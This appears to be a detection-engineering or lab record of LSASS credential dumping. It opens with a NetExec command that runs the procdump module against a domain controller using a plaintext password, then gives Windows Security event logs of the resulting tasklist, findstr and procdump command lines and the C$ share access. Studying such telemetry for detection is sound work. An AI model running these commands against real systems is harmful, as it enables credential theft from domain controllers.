@@ -1,0 +1,331 @@
+nxc smb 172.16.0.1 -u a-jsmith -p 'Password1' -M procdump --verbose
+
+https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/procdump.py
+https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/procdump.py#L71
+
+11/18/2024 08:59:06 PM
+LogName=Security
+EventCode=5145
+EventType=0
+ComputerName=DC01.mydomain.com
+SourceName=Microsoft Windows security auditing.
+Type=Information
+RecordNumber=249702
+Keywords=Audit Success
+TaskCategory=Detailed File Share
+OpCode=Info
+Message=A network share object was checked to see whether client can be granted desired access.
+	
+Subject:
+	Security ID:		S-1-5-21-3972285633-2492191808-684716012-1103
+	Account Name:		a-jsmith
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3DC31A
+
+Network Information:	
+	Object Type:		File
+	Source Address:		172.16.0.101
+	Source Port:		56004
+	
+Share Information:
+	Share Name:		\\*\C$
+	Share Path:		\??\C:\
+	Relative Target Name:	Windows\Temp\xBzuFE
+
+Access Request Information:
+	Access Mask:		0x1
+	Accesses:		ReadData (or ListDirectory)
+				
+Access Check Results:
+	-
+
+
+11/18/2024 09:00:23 PM
+LogName=Security
+EventCode=4688
+EventType=0
+ComputerName=DC01.mydomain.com
+SourceName=Microsoft Windows security auditing.
+Type=Information
+RecordNumber=250596
+Keywords=Audit Success
+TaskCategory=Process Creation
+OpCode=Info
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-18
+	Account Name:		DC01$
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		S-1-0-0
+	Account Name:		a-jsmith
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3EB838
+
+Process Information:
+	New Process ID:		0xbb4
+	New Process Name:	C:\Windows\System32\WerFault.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		S-1-16-12288
+	Creator Process ID:	0x122c
+	Creator Process Name:	C:\Windows\Temp\procdump64.exe
+	Process Command Line:	C:\Windows\system32\WerFault.exe -u -p 4652 -s 540
+
+
+ 11/18/2024 09:00:23 PM
+LogName=Security
+EventCode=4688
+EventType=0
+ComputerName=DC01.mydomain.com
+SourceName=Microsoft Windows security auditing.
+Type=Information
+RecordNumber=250593
+Keywords=Audit Success
+TaskCategory=Process Creation
+OpCode=Info
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-18
+	Account Name:		DC01$
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		S-1-0-0
+	Account Name:		a-jsmith
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3EB838
+
+Process Information:
+	New Process ID:		0xc10
+	New Process Name:	C:\Windows\Temp\procdump64.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		S-1-16-12288
+	Creator Process ID:	0x122c
+	Creator Process Name:	C:\Windows\Temp\procdump64.exe
+	Process Command Line:	C:\Windows\Temp\procdump.exe  -accepteula -ma 716 C:\Windows\Temp\DC01-AMD64-MYDOMAIN.dmp 
+
+
+11/18/2024 09:00:23 PM
+LogName=Security
+EventCode=4688
+EventType=0
+ComputerName=DC01.mydomain.com
+SourceName=Microsoft Windows security auditing.
+Type=Information
+RecordNumber=250581
+Keywords=Audit Success
+TaskCategory=Process Creation
+OpCode=Info
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-18
+	Account Name:		DC01$
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xa38
+	New Process Name:	C:\Windows\System32\WerFault.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		S-1-16-16384
+	Creator Process ID:	0xe0c
+	Creator Process Name:	C:\Windows\System32\svchost.exe
+	Process Command Line:	C:\Windows\system32\WerFault.exe -pss -s 636 -p 4652 -ip 4652
+
+
+ 11/18/2024 09:00:23 PM
+LogName=Security
+EventCode=4688
+EventType=0
+ComputerName=DC01.mydomain.com
+SourceName=Microsoft Windows security auditing.
+Type=Information
+RecordNumber=250525
+Keywords=Audit Success
+TaskCategory=Process Creation
+OpCode=Info
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-20
+	Account Name:		DC01$
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3E4
+
+Target Subject:
+	Security ID:		S-1-0-0
+	Account Name:		a-jsmith
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3EB838
+
+Process Information:
+	New Process ID:		0x1b58
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		S-1-16-12288
+	Creator Process ID:	0x17c4
+	Creator Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
+	Process Command Line:	cmd.exe /Q /c C:\Windows\Temp\procdump.exe -accepteula -ma 716 C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp 1> \Windows\Temp\DbaEMg 2>&1
+
+
+11/18/2024 09:00:21 PM
+LogName=Security
+EventCode=4688
+EventType=0
+ComputerName=DC01.mydomain.com
+SourceName=Microsoft Windows security auditing.
+Type=Information
+RecordNumber=250456
+Keywords=Audit Success
+TaskCategory=Process Creation
+OpCode=Info
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-21-3972285633-2492191808-684716012-1103
+	Account Name:		a-jsmith
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3E86E5
+
+Target Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1110
+	New Process Name:	C:\Windows\System32\findstr.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		S-1-16-12288
+	Creator Process ID:	0xb3c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	findstr  /i "lsass" 
+
+11/18/2024 09:00:21 PM
+LogName=Security
+EventCode=4688
+EventType=0
+ComputerName=DC01.mydomain.com
+SourceName=Microsoft Windows security auditing.
+Type=Information
+RecordNumber=250453
+Keywords=Audit Success
+TaskCategory=Process Creation
+OpCode=Info
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-21-3972285633-2492191808-684716012-1103
+	Account Name:		a-jsmith
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3E86E5
+
+Target Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xdb8
+	New Process Name:	C:\Windows\System32\tasklist.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		S-1-16-12288
+	Creator Process ID:	0xb3c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	tasklist  /v /fo csv 
+
+
+11/18/2024 09:00:21 PM
+LogName=Security
+EventCode=4688
+EventType=0
+ComputerName=DC01.mydomain.com
+SourceName=Microsoft Windows security auditing.
+Type=Information
+RecordNumber=250427
+Keywords=Audit Success
+TaskCategory=Process Creation
+OpCode=Info
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-20
+	Account Name:		DC01$
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3E4
+
+Target Subject:
+	Security ID:		S-1-0-0
+	Account Name:		a-jsmith
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3E86E5
+
+Process Information:
+	New Process ID:		0xb3c
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		S-1-16-12288
+	Creator Process ID:	0x17c4
+	Creator Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
+	Process Command Line:	cmd.exe /Q /c tasklist /v /fo csv | findstr /i "lsass" 1> \Windows\Temp\HpiLmy 2>&1
+
+
+ 11/18/2024 09:00:23 PM
+LogName=Security
+EventCode=5145
+EventType=0
+ComputerName=DC01.mydomain.com
+SourceName=Microsoft Windows security auditing.
+Type=Information
+RecordNumber=250503
+Keywords=Audit Success
+TaskCategory=Detailed File Share
+OpCode=Info
+Message=A network share object was checked to see whether client can be granted desired access.
+	
+Subject:
+	Security ID:		S-1-5-21-3972285633-2492191808-684716012-1103
+	Account Name:		a-jsmith
+	Account Domain:		MYDOMAIN
+	Logon ID:		0x3E85F3
+
+Network Information:	
+	Object Type:		File
+	Source Address:		172.16.0.101
+	Source Port:		60734
+	
+Share Information:
+	Share Name:		\\*\C$
+	Share Path:		\??\C:\
+	Relative Target Name:	Windows\Temp\HpiLmy
+
+Access Request Information:
+	Access Mask:		0x10080
+	Accesses:		DELETE
+				ReadAttributes
+				
+Access Check Results:
+	-
+
+ 
+
+
+ 
+ 
+
+ 
+ 
